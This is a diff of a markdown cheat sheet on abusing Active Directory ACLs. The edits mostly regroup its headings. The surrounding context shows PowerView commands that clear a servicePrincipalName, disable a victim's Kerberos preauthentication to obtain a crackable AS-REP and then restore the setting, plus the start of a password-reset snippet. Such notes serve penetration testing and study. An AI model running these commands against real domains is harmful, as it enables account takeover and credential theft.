@@ -101,6 +101,7 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
   ```
 ### Changing a users password
+#### From Windows
 * **Usering Powershell & Powerview to change a users password**  
   ```powershell
   # Create PSCredential Object
@@ -120,7 +121,6 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
 
 * **We can change a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.**  
 
-* Windows
   ```powershell
   # Modify the userAccountControl
   PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
@@ -134,9 +134,7 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
   PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
   ```
-
-Reset another user's password.
-
+#### From Linux
 * Windows/Linux:
 
   ```ps1
